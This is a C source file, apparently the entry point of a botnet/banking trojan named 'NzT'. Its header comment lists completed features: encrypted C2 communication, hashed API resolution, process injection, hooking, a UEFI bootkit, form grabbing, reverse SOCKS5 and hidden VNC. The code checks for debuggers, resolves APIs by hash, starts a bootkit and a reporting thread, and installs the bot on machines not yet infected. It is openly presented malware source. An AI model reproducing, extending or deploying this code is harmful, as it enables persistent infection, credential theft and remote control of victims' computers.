/*
*		- CORE
*			[X]  -	HTTP/HTTPS secure C2 communication
*				-	Server -> Generate RSA keypair
*				-	Client -> Generate AES keypair	 -> Encrypt with server RSA keypair
*				-	Client -> Encrypt data + keypair -> send AES keypair to server -> Server decrypts encrypted key, and decrypts data
*			[X]	-	Dynamic hashed API calls (Hell's Gate)
*			[X]	-	Dynamic configuration
*			[X]	-	x86<=>x64 process injection
*			[X]	-	Hooking engine
*			[X]  	-	Anti-Hooking engine
*			[X]	-	Modular plugin system
*			[X]	-	Store and encrypt strings in seperate PE section
*			[X]	-	UEFI Kit
*
*		- PLUGINS
*			[X] Form Grabber
*			[X] Reverse Socks5
*			[X] HVNC
*/
#include <Windows.h>

#include "crt.h"
#include "nzt.h"
#include "globals.h"
#include "report.h"
#include "antidebug.h"
#include "injection.h"
#include "utils.h"
#include "guid.h"
#include "install.h"
#include "config.h"

NzT_T NzT;

int BookitInitialize();

static WINERROR BotInitialize()
{
	WINERROR Status = NO_ERROR;

	MemoryZero(&NzT, sizeof(NzT_T));

	// Check if NzT has a debugger detached, DestroyOS if true
	if (IsBeingDebugged())
	{
		DebugPrint("NzT: Possible debugging detected, exiting...");
		return ERROR_UNSUCCESSFULL;
	}

	// Dynamically resolve all Windows API function by hash
	if (!ApiInitialize())
	{
		DebugPrint("NzT: failed to initialize API!");
		return ERROR_UNSUCCESSFULL;
	}

	// Make sure only one instance
	if (!(g_MainMutex = API(CreateMutexW)(NULL, FALSE, L"g_MainMutex")) || ((Status = API(GetLastError)()) == ERROR_ALREADY_EXISTS))
	{
		Status = FALSE;
		DebugPrint("NzT: Error Mutex already exists, NzT is already running!");
		return ERROR_UNSUCCESSFULL;
	}

	// Initinalize global variables
	if (!GlobalsInitialize(API(GetModuleHandleW(NULL)), G_SYSTEM_VERSION | G_CURRENT_PROCESS_ID | G_CURRENT_PROCESS_PATH))
	{
		DebugPrint("NzT: Failed to initialize globals!");
		return ERROR_UNSUCCESSFULL;
	}

	DebugPrint("NzT: Initialized!");

	// Start NzT EFI Bootkit
	BookitInitialize();

#ifdef _REPORT
	StartReportThread();
#endif

#ifdef _INSTALL
	if (!IsSystemInfected())
	{
		NzT.Type = NEW_INFECTION;
		InstallBot();
	}
	else
	{
		NzT.Type = RUNNING_INFECTION;
	}
#endif

	return Status;
}

WINERROR BotShutdown()
{
	WINERROR Status = NO_ERROR;

	DebugPrint("NzT: Shutdown initiated");

	if (g_ShutdownEvent)
	{
		API(SetEvent)(g_ShutdownEvent);
	}

	if (g_MainMutex)
	{
		API(ReleaseMutex(g_MainMutex));
		API(CloseHandle(g_MainMutex));
	}

	return Status;
}

INT EntryPoint()
{
	BotInitialize();
	return 0;
}
